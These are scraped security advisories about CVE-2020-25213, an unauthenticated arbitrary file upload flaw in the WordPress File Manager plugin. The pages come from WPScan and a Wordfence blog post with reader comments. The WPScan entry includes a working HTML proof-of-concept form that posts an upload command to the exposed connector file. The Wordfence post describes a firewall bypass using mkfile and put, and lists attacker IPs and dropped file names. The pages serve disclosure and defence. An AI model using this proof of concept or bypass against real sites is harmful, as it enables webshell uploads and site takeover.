Target url https://wpscan.com/vulnerability/e528ae38-72f0-49ff-9878-922eff59ace9:
Skip to content

[](/)

  * [Features](https://a8cteam5105.wordpress.com/features/)
  * [Pricing](https://a8cteam5105.wordpress.com/pricing/)
  * Solutions
    * [Status](https://status.wpscan.com/)
    * [API Details](/api)
    * [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
  * Vulnerabilities
    * [Themes](/themes)
    * [WordPress](/wordpresses)
    * [Plugins](/plugins)
    * [Stats](/statistics)
    * [Submit Vulnerabilities](/submit)
    * [Leaderboard](/leaderboard)
  * Resources
    * [Blog](/blog)
    * [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
    * [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
    * [WPScan Glossary](/wpscan-glossary)
    * [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)



Search

Login[Talk to sales](/contact/enterprise)

##  WordPress Plugin Vulnerabilities

# File Manager 6.0-6.9 - Unauthenticated Arbitrary File Upload leading to RCE

### Description

Seravo noticed multiple cases where WordPress sites were breached using 0-day in wp-file-manager (confirmed with v6.8, which was the latest version available in wordpress.org).

File lib/php/connector.minimal.php can be by default opened directly, and this file loads lib/php/elFinderConnector.class.php which reads POST/GET variables, and then allows executing some internal features, like uploading files. PHP is allowed, thus this leads to unauthenticated arbitrary file upload and remote code execution.

It seems that this vulnerability was originally discovered and published publicly on Twitter on August 26th (see references), and was later seen being exploited in the wild by Seravo.

### Proof of Concept

https://ypcs.fi/misc/code/pocs/2020-wp-file-manager-v67.py <html> <body> <form method="POST" enctype="multipart/form-data" action="https://example.com/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"> <input type="hidden" name="cmd" value="upload"/> <input type="hidden" name="target" value="l1_Lw"/> <input type="file" name="upload[]"/><br/><br/> <input type="submit" value="Upload"/> </form> </body>

### Affects Plugins

[ ![Plugin icon](https://s0.wp.com/wp-content/themes/a8c/wpscan/assets/img/plugin-icon.svg) wp-file-manager ](https://a8cteam5105.wordpress.com/plugin/wp-file-manager/)

![](https://s0.wp.com/wp-content/themes/a8c/wpscan/assets/img/checkmark-green-alt.svg) Fixed in 6.9 

### References

CVE 

[CVE-2020-25213](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25213)

URL 

<https://blog.nintechnet.com/critical-zero-day-vulnerability-fixed-in-wordpress-file-manager-700000-installations/>

URL 

<https://www.wordfence.com/blog/2020/09/700000-wordpress-users-affected-by-zero-day-vulnerability-in-file-manager-plugin/>

URL 

<https://seravo.com/blog/0-day-vulnerability-in-wp-file-manager/>

URL 

<https://blog.sucuri.net/2020/09/critical-vulnerability-file-manager-affecting-700k-wordpress-websites.html>

URL 

<https://twitter.com/w4fz5uck5/status/1298402173554958338>

### Miscellaneous

Original Researcher 

w4fz5uck5 

Submitter 

Ville Korhonen 

Submitter website 

<https://seravo.com>

Submitter twitter 

[Seravo](//twitter.com/Seravo)

Verified 

Yes 

WPVDB ID 

[e528ae38-72f0-49ff-9878-922eff59ace9](https://a8cteam5105.wordpress.com/vulnerability/e528ae38-72f0-49ff-9878-922eff59ace9/)

### Timeline

Publicly Published 

2020-09-01 (about 5 years ago) 

Added 

2020-09-01 (about 5 years ago) 

Last Updated 

2021-07-19 (about 4 years ago) 

### Other

Published 

Title 

Published 

2025-03-31

Title 

[ WP Pro Real Estate 7 < 3.5.5 - Authenticated (Custom) Arbitrary File Upload ](https://a8cteam5105.wordpress.com/vulnerability/0f456721-bda1-45d7-93a7-862fc2737ddd/)

Published 

2022-02-07

Title 

[ All-in-One WP Migration < 7.41 - Admin+ Arbitrary File Upload to RCE ](https://a8cteam5105.wordpress.com/vulnerability/87c6052c-2628-4987-a9a3-a03b5ca1e083/)

Published 

2024-10-17

Title 

[ Affiliator <= 2.1.3 - Unauthenticated Arbitrary File Upload ](https://a8cteam5105.wordpress.com/vulnerability/7acbfb65-c99a-496a-bb9e-7c376b7b8e8e/)

Published 

2025-02-21

Title 

[ WPvivid < 0.9.113 - Admin+ Arbitrary File Upload ](https://a8cteam5105.wordpress.com/vulnerability/b5e8196c-9d91-4318-83ec-ced2e8085017/)

Published 

2023-12-27

Title 

[ TerraClassifieds <= 2.0.3 Unauthenticated Arbitrary File Upload ](https://a8cteam5105.wordpress.com/vulnerability/bc9d29b4-7855-4e05-822c-d0f751f870a3/)

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

  * [WordPress](/wordpresses)
  * [Plugins](/plugins)
  * [Themes](/themes)
  * [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
  * [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)



#### About

  * [How it works](/features)
  * [Pricing](/pricing)
  * [WordPress plugin](https://wordpress.org/plugins/wpscan/)
  * [Blog](/blog)
  * [Contact](/contact)



#### For Developers

  * [Status](https://status.wpscan.com/)
  * [API details](/api)
  * [CLI scanner](/wordpress-cli-scanner)



#### Other

  * [Privacy](https://automattic.com/privacy/)
  * [Terms of service](/terms)
  * [Submission terms](/submission-terms/)
  * [Disclosure policy](/vulnerability-disclosure-policy)
  * [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)



* * *

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

  * [GitHub](https://github.com/wpscanteam/wpscan/)
  * [Twitter](https://twitter.com/_wpscan_)
  * [Facebook](https://www.facebook.com/WPScan)



* * *

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

  * [ Subscribe ]() [ Subscribed ]()

    * [ ![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan ](https://wpscan.com)

Join 30,426 other subscribers

Sign me up 

    * Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)

  *     * [ ![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan ](https://wpscan.com)
    * [ Subscribe ]() [ Subscribed ]()
    * [Sign up](https://wordpress.com/start/)
    * [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
    * [ Report this content ](https://wordpress.com/abuse/?report_url=https://wpscan.com)
    * [ View site in Reader ](https://wordpress.com/reader/feeds/156197069)
    * [Manage subscriptions](https://subscribe.wordpress.com/)
    * [Collapse this bar]()




![](https://pixel.wp.com/g.gif?blog=221720208&v=wpcom&tz=-4&user_id=0&arch_home=1&subd=a8cteam5105&host=wpscan.com&ref=&rand=0.17734829203570346)

NotificationsTarget url https://blog.nintechnet.com/critical-zero-day-vulnerability-fixed-in-wordpress-file-manager-700000-installations/:
# blog.nintechnet.com

Verify you are human by completing the action below.

blog.nintechnet.com needs to review the security of your connection before proceeding.

Verification successful

Waiting for blog.nintechnet.com to respond...

Ray ID: `98ef9ccb5b68c793`

Performance & security by [Cloudflare](https://www.cloudflare.com?utm_source=challenge&utm_campaign=m)Target url https://www.wordfence.com/blog/2020/09/700000-wordpress-users-affected-by-zero-day-vulnerability-in-file-manager-plugin/:
Have you been hacked? [Get Help](/wordfence-site-cleanings/?promo_id=top-get-help&promo_name=get-site-clean&promo_creative=yellow-txt&promo_position=sw-top)

[Create Account _**_](/wp-login.php?action=register)

[Sign In _**_](/wp-login.php)

[](/cart/)

[ ](/)

  * [Products](/products/)
    * [Our Products](/products/)
    * [Wordfence Free](/products/wordfence-free/)
    * [Wordfence Premium](/products/wordfence-premium/)
    * [Wordfence Care](/products/wordfence-care/)
    * [Wordfence Response](/products/wordfence-response/)
    * [Wordfence CLI](/products/wordfence-cli/)
    * [Wordfence Intelligence](/products/wordfence-intelligence/)
    * [Wordfence Central](/products/wordfence-central/)
    * [Compare Plans](/products/pricing/)
  * [Intelligence](/threat-intel/)
    * Overview 
      * [Dashboard](/threat-intel/)
      * [About](/products/wordfence-intelligence/)
    *     * Vulnerability Database 
      * [All Vulnerabilities](/threat-intel/vulnerabilities/)
      * [Plugins](/threat-intel/vulnerabilities/wordpress-plugins/)
      * [Themes](/threat-intel/vulnerabilities/wordpress-themes/)
      * [WordPress Core](/threat-intel/vulnerabilities/wordpress-core/)
      * [Researchers](/threat-intel/vulnerabilities/researchers/)
    * Bug Bounty Program 
      * [Overview](/threat-intel/bug-bounty-program/)
      * [Submit Vulnerability](/threat-intel/vulnerabilities/submit/)
      * [Register](/threat-intel/researcher-register)
      * [Access Dashboard](/researcher-dashboard/)
    *     * Vulnerability Management 
      * [Overview](/threat-intel/vendor/vulnerability-management-portal/)
      * [Register](/threat-intel/vendor/register/)
      * [Access Portal](/threat-intel/vendor/portal/)
    * Documentation 
      * [API Access](/help/wordfence-intelligence/v2-accessing-and-consuming-the-vulnerability-data-feed/)
      * [Webhook Integration](/help/wordfence-intelligence/wordfence-intelligence-webhook-notifications/)
  * [Support](/help/)
    * [Documentation](/help/)
    * [Learning Center](/learn/)
    * [Free Support](https://wordpress.org/support/plugin/wordfence/)
    * [Premium Support](https://support.wordfence.com/)
  * [News](/blog/)
    * [Blog](/blog/)
    * [In The News](/news/)
    * [WP Security Mailing List](/subscribe-to-the-wordfence-email-list/)
    * [Vulnerability Advisories](/vulnerability-advisories/)
  * [About](/about-wordfence/)
    * [About Wordfence](/about-wordfence/)
    * [Employment](/employment/)
    * [Security](/security/)
    * [CVE Request Form](/request-cve/)
    * [Contact](/contact/)
    * [Privacy Policy](/privacy-policy/)
    * [Terms of Service](/terms-of-service/)



  * [View Pricing](/products/pricing/)



  *     * Products **
      * [Wordfence Free](/products/wordfence-free/)
      * [Wordfence Premium](/products/wordfence-premium/)
      * [Wordfence Care](/products/wordfence-care/)
      * [Wordfence Response](/products/wordfence-response/)
      * [Wordfence CLI](/products/wordfence-cli/)
      * [Wordfence Intelligence](/products/wordfence-intelligence/)
      * [Wordfence Central](/products/wordfence-central/)
      * [Compare Plans](/products/pricing/)
    * Intelligence **
      * Overview 
        * [Dashboard](/threat-intel/)
        * [About](/products/wordfence-intelligence/)
      * Vulnerability Database 
        * [All Vulnerabilities](/threat-intel/vulnerabilities/)
        * [Plugins](/threat-intel/vulnerabilities/wordpress-plugins/)
        * [Themes](/threat-intel/vulnerabilities/wordpress-themes/)
        * [WordPress Core](/threat-intel/vulnerabilities/wordpress-core/)
        * [Researchers](/threat-intel/vulnerabilities/researchers/)
      * Bug Bounty Program 
        * [Bug Bounty Program](/threat-intel/bug-bounty-program/)
        * [Submit Vulnerability](/threat-intel/vulnerabilities/submit/)
        * [Register](/threat-intel/researcher-register)
        * [Access Dashboard](/researcher-dashboard/)
      * Vulnerability Management 
        * [Overview](/threat-intel/vendor/vulnerability-management-portal/)
        * [Register](/threat-intel/vendor/register/)
        * [Access Portal](/threat-intel/vendor/portal/)
      * Documentation 
        * [API Access](/help/wordfence-intelligence/v2-accessing-and-consuming-the-vulnerability-data-feed/)
        * [Webhook Integration](/help/wordfence-intelligence/wordfence-intelligence-webhook-notifications/)
    * Support **
      * [Documentation](/help/)
      * [Learning Center](/learn/)
      * [Free Support](https://wordpress.org/support/plugin/wordfence/)
      * [Premium Support](https://support.wordfence.com/)
    * News **
      * [Blog](/blog/)
      * [In The News](/news/)
      * [WP Security Mailing List](/subscribe-to-the-wordfence-email-list/)
      * [Vulnerability Advisories](/vulnerability-advisories/)
    * About **
      * [About Wordfence](/about-wordfence/)
      * [Employment](/employment/)
      * [Security](/security/)
      * [CVE Request Form](/request-cve/)
      * [Contact](/contact/)
      * [Privacy Policy](/privacy-policy/)
      * [Terms of Service](/terms-of-service/)



![](https://www.wordfence.com/wp-content/uploads/2020/09/FileManagerZeroDay.png)

[![](https://secure.gravatar.com/avatar/3c8ed72f575bceacbaf16c6ae1556fb3661694ea13275191feee76cb13635b01?s=80&d=mm&r=g)Chloe Chamberland](https://www.wordfence.com/blog/author/wfchloe/)

September 1, 2020 

# 700,000 WordPress Users Affected by Zero-Day Vulnerability in File Manager Plugin

This morning, on September 1, 2020, the Wordfence Threat Intelligence team was alerted to the presence of a vulnerability being actively exploited in [File Manager](https://wordpress.org/plugins/wp-file-manager/), a WordPress plugin with over 700,000 active installations. This vulnerability allowed unauthenticated users to execute commands and upload malicious files on a target site.

A patch was released this morning on September 1, 2020. We are seeing this vulnerability being actively exploited in the wild, therefore, we urge users to update to the latest version, 6.9, immediately since it contains a patch for this vulnerability and will keep you protected.

Wordfence Premium users as well as those still using the Free version are protected against this attack campaign by the Wordfence firewall’s built-in file upload protection, though the Wordfence firewall needs to be optimized in order to protect your site from this vulnerability.

While analyzing the vulnerability, we discovered that it was possible to bypass the built-in file upload protection so we deployed an additional firewall rule for maximum coverage. Wordfence Premium customers received this new firewall rule today, September 1, 2020, at 2:56PM UTC. Free Wordfence users will receive the rule after thirty days on October 1, 2020.

****Description:**** Remote Code Execution   
****Affected Plugin:**** [File Manager](https://wordpress.org/plugins/wp-file-manager/)   
****Plugin Slug:**** wp-file-manager   
****Affected Versions:**** 6.0-6.8   
****CVSS Score:**** 10.00 (Critical)   
****CVSS Vector:**** [CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)   
****Patched Versions:**** 6.9

File Manager is a plugin designed to help WordPress administrators manage files on their sites. The plugin contains an additional library, elFinder, which is an open-source file manager designed to create a simple file management interface and provides the core functionality behind the file manager. The File Manager plugin used this library in a way that introduced a vulnerability.

The core of the issue began with the File Manager plugin renaming the extension on the elFinder library’s `connector.minimal.php.dist` file to .php so it could be executed directly, even though the connector file was not used by the File Manager itself. Such libraries often include example files that are not intended to be used “as-is” without adding access controls, and this file had no direct access restrictions, meaning the file could be accessed by anyone. This file could be used to initiate an elFinder command and was hooked to the `elFinderConnector.class.php` file.

149 150 151 |  `// run elFinder` `$connector` `= ``new` `elFinderConnector(``new` `elFinder(``$opts``));` `$connector``->run();`  
---|---  
  
Any parameters sent in a request to `connector.minimal.php` would be processed by the `run()` function in the `elFinderConnector.class.php` file, including the command that was supplied in the `cmd` parameter.

71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 |  `public` `function` `run()` ` ``{` ` ``$isPost` `= ``$this``->reqMethod === ``'POST'``;` ` ``$src` `= ``$isPost` `? ``array_merge``(``$_GET``, ``$_POST``) : ``$_GET``;` ` ``$maxInputVars` `= (!``$src` `|| isset(``$src``[``'targets'``])) ? ``ini_get``(``'max_input_vars'``) : null;` ` ``if` `((!``$src` `|| ``$maxInputVars``) && ``$rawPostData` `= ``file_get_contents``(``'php://input'``)) {` ` ``// for max_input_vars and supports IE XDomainRequest()` ` ``$parts` `= ``explode``(``'&'``, ``$rawPostData``);` ` ``if` `(!``$src` `|| ``$maxInputVars` `< ``count``(``$parts``)) {` ` ``$src` `= ``array``();` ` ``foreach` `(``$parts` `as` `$part``) {` ` ``list(``$key``, ``$value``) = ``array_pad``(``explode``(``'='``, ``$part``), 2, ``''``);` ` ``$key` `= rawurldecode(``$key``);` ` ``if` `(preg_match(``'/^(.+?)\[([^\[\]]*)\]$/'``, ``$key``, ``$m``)) {` ` ``$key` `= ``$m``[1];` ` ``$idx` `= ``$m``[2];` ` ``if` `(!isset(``$src``[``$key``])) {` ` ``$src``[``$key``] = ``array``();` ` ``}` ` ``if` `(``$idx``) {` ` ``$src``[``$key``][``$idx``] = rawurldecode(``$value``);` ` ``} ``else` `{` ` ``$src``[``$key``][] = rawurldecode(``$value``);` ` ``}` ` ``} ``else` `{` ` ``$src``[``$key``] = rawurldecode(``$value``);` ` ``}` ` ``}` ` ``$_POST` `= ``$this``->input_filter(``$src``);` ` ``$_REQUEST` `= ``$this``->input_filter(``array_merge_recursive``(``$src``, ``$_REQUEST``));` ` ``}` ` ``}` ` ``if` `(isset(``$src``[``'targets'``]) && ``$this``->elFinder->maxTargets && ``count``(``$src``[``'targets'``]) > ``$this``->elFinder->maxTargets) {` ` ``$this``->output(``array``(``'error'` `=> ``$this``->elFinder->error(elFinder::ERROR_MAX_TARGTES)));` ` ``}` ` ``$cmd` `= isset(``$src``[``'cmd'``]) ? ``$src``[``'cmd'``] : ``''``;` ` ``$args` `= ``array``();`  
---|---  
  
The list of commands available in elFinder are as follows.

243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 |  `/**` ` ``* Commands and required arguments list` ` ``*` ` ``* @var array` ` ``**/` ` ``protected` `$commands` `= ``array``(` ` ``'abort'` `=> ``array``(``'id'` `=> true),` ` ``'archive'` `=> ``array``(``'targets'` `=> true, ``'type'` `=> true, ``'mimes'` `=> false, ``'name'` `=> false),` ` ``'callback'` `=> ``array``(``'node'` `=> true, ``'json'` `=> false, ``'bind'` `=> false, ``'done'` `=> false),` ` ``'chmod'` `=> ``array``(``'targets'` `=> true, ``'mode'` `=> true),` ` ``'dim'` `=> ``array``(``'target'` `=> true, ``'substitute'` `=> false),` ` ``'duplicate'` `=> ``array``(``'targets'` `=> true, ``'suffix'` `=> false),` ` ``'editor'` `=> ``array``(``'name'` `=> true, ``'method'` `=> true, ``'args'` `=> false),` ` ``'extract'` `=> ``array``(``'target'` `=> true, ``'mimes'` `=> false, ``'makedir'` `=> false),` ` ``'file'` `=> ``array``(``'target'` `=> true, ``'download'` `=> false, ``'cpath'` `=> false, ``'onetime'` `=> false),` ` ``'get'` `=> ``array``(``'target'` `=> true, ``'conv'` `=> false),` ` ``'info'` `=> ``array``(``'targets'` `=> true, ``'compare'` `=> false),` ` ``'ls'` `=> ``array``(``'target'` `=> true, ``'mimes'` `=> false, ``'intersect'` `=> false),` ` ``'mkdir'` `=> ``array``(``'target'` `=> true, ``'name'` `=> false, ``'dirs'` `=> false),` ` ``'mkfile'` `=> ``array``(``'target'` `=> true, ``'name'` `=> true, ``'mimes'` `=> false),` ` ``'netmount'` `=> ``array``(``'protocol'` `=> true, ``'host'` `=> true, ``'path'` `=> false, ``'port'` `=> false, ``'user'` `=> false, ``'pass'` `=> false, ``'alias'` `=> false, ``'options'` `=> false),` ` ``'open'` `=> ``array``(``'target'` `=> false, ``'tree'` `=> false, ``'init'` `=> false, ``'mimes'` `=> false, ``'compare'` `=> false),` ` ``'parents'` `=> ``array``(``'target'` `=> true, ``'until'` `=> false),` ` ``'paste'` `=> ``array``(``'dst'` `=> true, ``'targets'` `=> true, ``'cut'` `=> false, ``'mimes'` `=> false, ``'renames'` `=> false, ``'hashes'` `=> false, ``'suffix'` `=> false),` ` ``'put'` `=> ``array``(``'target'` `=> true, ``'content'` `=> ``''``, ``'mimes'` `=> false, ``'encoding'` `=> false),` ` ``'rename'` `=> ``array``(``'target'` `=> true, ``'name'` `=> true, ``'mimes'` `=> false, ``'targets'` `=> false, ``'q'` `=> false),` ` ``'resize'` `=> ``array``(``'target'` `=> true, ``'width'` `=> false, ``'height'` `=> false, ``'mode'` `=> false, ``'x'` `=> false, ``'y'` `=> false, ``'degree'` `=> false, ``'quality'` `=> false, ``'bg'` `=> false),` ` ``'rm'` `=> ``array``(``'targets'` `=> true),` ` ``'search'` `=> ``array``(``'q'` `=> true, ``'mimes'` `=> false, ``'target'` `=> false, ``'type'` `=> false),` ` ``'size'` `=> ``array``(``'targets'` `=> true),` ` ``'subdirs'` `=> ``array``(``'targets'` `=> true),` ` ``'tmb'` `=> ``array``(``'targets'` `=> true),` ` ``'tree'` `=> ``array``(``'target'` `=> true),` ` ``'upload'` `=> ``array``(``'target'` `=> true, ``'FILES'` `=> true, ``'mimes'` `=> false, ``'html'` `=> false, ``'upload'` `=> false, ``'name'` `=> false, ``'upload_path'` `=> false, ``'chunk'` `=> false, ``'cid'` `=> false, ``'node'` `=> false, ``'renames'` `=> false, ``'hashes'` `=> false, ``'suffix'` `=> false, ``'mtime'` `=> false, ``'overwrite'` `=> false, ``'contentSaveId'` `=> false),` ` ``'url'` `=> ``array``(``'target'` `=> true, ``'options'` `=> false),` ` ``'zipdl'` `=> ``array``(``'targets'` `=> true, ``'download'` `=> false)` ` ``);`  
---|---  
  
The good news is that elFinder has built-in protection against directory traversal, so an attacker would be unable to use any of these commands on any files outside of the `plugins/wp-file-manager/lib/files/` directory.

The attacks we are seeing in the wild are using the `upload` command to upload PHP files containing webshells hidden in an image to the `wp-content/plugins/wp-file-manager/lib/files/` directory.

Fortunately, both Wordfence Premium and free users have been protected against the campaign targeting this vulnerability. However, for optimal protection we created an additional firewall rule.

### Why We Created An Additional Firewall Rule

While our firewall’s built-in protection prevented direct file upload, we determined that it was possible to send a specially crafted request that would create an empty PHP file by using the `mkfile` command in the `cmd` parameter. An attacker could then send a separate request to save malicious code to that file by sending a request with the `cmd` parameter set to `put`. Additionally, other bypasses may be possible, so we created a firewall rule to completely block any and all access to the `connector.minimal.php` file.

The File Manager plugin patched the issue by removing the `lib/php/connector.minimal.php` file from the plugin altogether, and manually removing this file should also prevent attackers from exploiting this vulnerability without impacting normal functionality. This bypass has not been targeted in the wild.

### A Small Note From The Team at Wordfence

When using utility plugins like this file manager plugin, we recommend taking the utmost precaution. Plugins like this one contain several features that if exposed within the admin area of your WordPress installation, could cause serious problems.

A file manager plugin like this would make it possible for an attacker to manipulate or upload any files of their choosing directly from the WordPress dashboard, potentially allowing them to escalate privileges once in the site’s admin area. For example, an attacker could gain access to the admin area of the site using a compromised password, then access this plugin and upload a webshell to do further enumeration of the server and potentially escalate their attack using another exploit.

For this reason, we recommend uninstalling utility plugins, like file management plugins, when they are not in use, so that they do not create an easy intrusion vector for attackers to escalate their privileges.

## Indicators of Compromise

The Wordfence firewall has blocked over 450,000 exploit attempts targeting this vulnerability over the past several days. We are seeing attackers attempting to inject random files, all of which appear to begin with the word “hard” or “x.” From our firewall attack data, it appears that attackers may be probing for the vulnerability with empty files and if successful, may attempt to inject a malicious file.

Here is a list of some of the files we are seeing uploaded:

  * hardfork.php
  * hardfind.php
  * x.php



Please look for these files in the `/wp-content/plugins/wp-file-manager/lib/files` directory of your site.

The top 6 attacking IP addresses that we are seeing are as follows.

  * 185.222.57.183
  * 185.81.157.132
  * 185.81.157.112
  * 185.222.57.93
  * 185.81.157.177
  * 185.81.157.133



Please look for these offending IP Addresses in your site’s log files.

## Response Timeline

****September 1, 2020 7:00AM UTC –**** Gonzalo Cruz from Arsys reaches out to us, letting us know that an offending IP address 185.81.157.0 was attempting to upload PHP files to their sites by sending POST requests to `wp-file-manager/lib/php/connector.minimal.php`   
****September 1, 2020 11:52AM UTC –**** Cruz was able to reproduce the vulnerability and provided us with a working proof of concept.   
****September 1, 2020 12:00PM UTC –**** Wordfence team starts the day.   
****September 1, 2020 12:28PM UTC –**** Colette Chamberland, Wordfence’s Director of Information Security, responds to Cruz acknowledging his report and notifies the Wordfence Threat Intelligence team of the report.   
****September 1, 2020 12:33 PM UTC –**** File Manager releases a patch.   
****September 1, 2020 12:48PM UTC –**** The Wordfence Threat intelligence team begins looking into the issue.   
****September 1, 2020 12:58PM UTC –**** The Wordfence Threat Intelligence team verifies the issue. We begin testing the vulnerability using the proof of concept, check blocked hits from the Wordfence Firewall, and analyze the code for any firewall bypasses.   
****September 1, 2020 2:24PM UTC –**** The Wordfence Threat Intelligence team discovers a bypass.   
****September 1, 2020 2:42PM UTC –**** A firewall rule is created for the bypass.   
****September 1, 2020 2:56PM UTC –**** The firewall rule is deployed for premium customers.   
****October 1, 2020 –**** Wordfence free users receive additional rule.

## Conclusion

In today’s post, we detailed a zero-day vulnerability being actively exploited in the File Manager plugin that allows unauthenticated attackers to execute arbitrary code on a WordPress site. This vulnerability was patched this morning and we strongly recommend updating to the latest version of the File Manager plugin, currently version 6.9, right now.

Both [Wordfence Premium](https://www.wordfence.com/wordfence-signup/?promo_id=blog20200901&promo_name=get-premium&promo_creative=txt&promo_position=conclusion) users and sites still running the free version of Wordfence have been protected against attacks targeting this vulnerability due to the Wordfence firewall’s built-in File Upload protection. Wordfence Premium users also received an additional firewall rule protecting against any potential bypasses today, September 1, 2020. Sites still using the free version of Wordfence will receive this rule in 30 days on October 1, 2020.

If you know a friend or colleague who is using this plugin on their site, please forward this advisory to them to help keep their sites protected.

_*Special thanks to Ramuel Gall for his research contributions in analyzing the scope and impact of the vulnerability along with testing the firewall rule and contributing to this blog post. Also, a special thanks to Gonzalo Cruz from Arsys for reporting this vulnerability to us.*_

Search

### Trust Your Site   
to the Leader in WordPress Security

Wordfence includes an endpoint firewall, malware scanner, robust login security features, live traffic views, and more. Discover why over 5 million WordPress sites put their trust in Wordfence.

[ Protect Your Site ](/products/pricing/)

****Did you enjoy this post? Share it!****

[_*Facebook*_ ********](http://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.wordfence.com%2Fblog%2F2020%2F09%2F700000-wordpress-users-affected-by-zero-day-vulnerability-in-file-manager-plugin%2F) [_*Twitter*_ ********](https://twitter.com/share?url=https%3A%2F%2Fwww.wordfence.com%2Fblog%2F2020%2F09%2F700000-wordpress-users-affected-by-zero-day-vulnerability-in-file-manager-plugin%2F&text=700%2C000%20WordPress%20Users%20Affected%20by%20Zero-Day%20Vulnerability%20in%20File%20Manager%20Plugin&via=wordfence) [_*LinkedIn*_ ********](https://www.linkedin.com/shareArticle?url=https%3A%2F%2Fwww.wordfence.com%2Fblog%2F2020%2F09%2F700000-wordpress-users-affected-by-zero-day-vulnerability-in-file-manager-plugin%2F)

## Comments

16 Comments

  * ![](https://secure.gravatar.com/avatar/fe1541ecaf52e528bd94cbb9a112fccddd6c8a1b72a9d4f53277b58298088e75?s=96&d=mm&r=g)

Rene

September 1, 2020   
10:08 pm

We've noticed yesterday injected random named files in a wp file manager 6.7 installation in the plugins folder like /libs/files/jhsdfjsfd.php

    * ![](https://secure.gravatar.com/avatar/44eed61faebf0ba97eb7ef7a493d1951fd4e3dd1a2b862f64bab7bc6d7c6ea9c?s=96&d=mm&r=g)

Matt

September 3, 2020   
3:40 pm

You gotta get those files cleared out asap. And make sure new ones don't reappear.

    * ![](https://secure.gravatar.com/avatar/3c8ed72f575bceacbaf16c6ae1556fb3661694ea13275191feee76cb13635b01?s=96&d=mm&r=g)

Chloe Chamberland

September 4, 2020   
6:41 am

Hi Rene, 

I'm sorry to hear your site was affected. Please follow our [site cleaning guide](https://www.wordfence.com/docs/how-to-clean-a-hacked-wordpress-site-using-wordfence/) to ensure you have removed the entire infection, update the plugin immediately to prevent any re-infections, and ensure you have the Wordfence firewall running and optimized. Alternatively, you can use our [site cleaning service](https://www.wordfence.com/wordfence-site-cleanings/?promo_id=top-get-help&promo_name=get-site-clean&promo_creative=yellow-txt&promo_position=sw-top) where our team of experts will handle to site cleaning process for you.

    * ![](https://secure.gravatar.com/avatar/33d32c9c7cdfc5f25149b259e0a33a3a1f39c60ef8115ba50df756bd3ce5b64c?s=96&d=mm&r=g)

Baljit Singh

September 9, 2020   
3:22 am

I updated to the latest version and my issues are now solved.

  * ![](https://secure.gravatar.com/avatar/5e3551d9ecf38b7350dfd1f16a1e24a4ba6d684b97659cb16761d688202a06d3?s=96&d=mm&r=g)

Rob

September 3, 2020   
8:38 am

What if i have a .htpasswd on my site?

    * ![](https://secure.gravatar.com/avatar/3c8ed72f575bceacbaf16c6ae1556fb3661694ea13275191feee76cb13635b01?s=96&d=mm&r=g)

Chloe Chamberland

September 4, 2020   
6:35 am

Hi Rob, 

If you have .htpasswd protecting your entire site (including front-end and back-end) you shouldn't have anything to worry about. If the .htpasswd file is only protecting the /wp-admin area, then your site would still be considered vulnerable to this exploit. Regardless, I would recommend updating to the latest version available as soon as possible.

  * ![](https://secure.gravatar.com/avatar/c044a5ac78a8005aee61cd01f3befb9e95746bec7b65ce594ca8a1b510ea4a1d?s=96&d=mm&r=g)

Just_a_note

September 3, 2020   
10:12 am

Attacks for us started on the 25th for another products with ElFinder. This attacker you listed appeared around the 29th.   
20.37.246.247 (Looking for another plugin with ElFinder, not wp file manager )   
Other IPs you missed:   
107.172.100.204   
185.244.172.39   
195.206.107.28   
162.144.212.16

    * ![](https://secure.gravatar.com/avatar/3c8ed72f575bceacbaf16c6ae1556fb3661694ea13275191feee76cb13635b01?s=96&d=mm&r=g)

Chloe Chamberland

September 4, 2020   
6:38 am

Thank you for adding additional information! For brevity we only included the top 6 offending IPs, there were several more on the list omitted from this post.

  * ![](https://secure.gravatar.com/avatar/65e16549569a02bfe42d454f1e0b166623290511b1c141afbc23292f206d90a2?s=96&d=mm&r=g)

Ritz

September 4, 2020   
1:20 am

Just noticed I got this weird activity, thanks to cleantalk. However the reports are from 2 IPs (Taiwan) ;   
wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php (IP 2002:b951:9d70::b951:9d70)   
wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php (IP 2002:b951:9def::b951:9def).

I don't remember I ever installed WP File Manager on my website, since I cannot find the plugin installed (I checked on WP dashboard and Cpanel folder).

    * ![](https://secure.gravatar.com/avatar/3c8ed72f575bceacbaf16c6ae1556fb3661694ea13275191feee76cb13635b01?s=96&d=mm&r=g)

Chloe Chamberland

